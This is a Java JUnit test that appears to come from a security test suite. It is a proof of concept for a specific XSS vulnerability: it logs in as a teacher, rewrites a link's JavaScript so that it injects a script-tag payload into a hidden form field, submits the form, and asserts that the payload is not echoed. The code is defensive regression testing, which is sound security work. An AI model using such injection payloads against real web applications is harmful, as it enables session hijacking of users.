package tests.suite;

import net.sourceforge.jwebunit.api.IElement;
import net.sourceforge.jwebunit.junit.WebTester;
import org.aeonbits.owner.ConfigFactory;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;
import tests.utilities.Environment;
import tests.utilities.Helper;

import java.io.IOException;

/**
 * Proof of concept for the XSS vulnerability #89.b.
 *
 * @author Davide Pedranz
 */
public final class Vulnerability89b {

    // dependencies
    private WebTester tester;
    private Helper helper;

    @Before
    public void prepare() {
        final Environment environment = ConfigFactory.create(Environment.class, System.getenv());
        tester = new WebTester();
        tester.setBaseUrl(environment.baseURL());
        helper = new Helper(environment, tester);
    }

    @Test
    public void test() throws IOException {

        // the vulnerable page is accessible by a teacher
        helper.loginAsTeacher();
        tester.assertMatch("teacher teacher's Classes");

        // tamper the variable in the hidden form field
        // NB: for some reason, JWebUnit gets crazy on this page and does not found forms and buttons correctly
        // the code below is a workaround
        final String xss = "2 \\'> <script>alert(\\'xss\\')</script> <span id=\\'xss";
        final IElement elementByXPath = tester.getElementByXPath("//a[@href='JavaScript:document.classes.selectclass.value=1;document.classes.page2.value=1;document.classes.submit();']");
        elementByXPath.setAttribute("href", "JavaScript:document.classes.page.value='" + xss + "';document.classes.selectclass.value=1;document.classes.page2.value=1;document.classes.submit();");
        tester.clickLinkWithText("course");

        // check if the XSS was successful
        tester.assertMatch("Class Settings");
        tester.assertNoMatch("<script>alert('xss')</script>");
    }

    @After
    public void cleanup() {
        // no-op, nothing to cleanup
    }

}
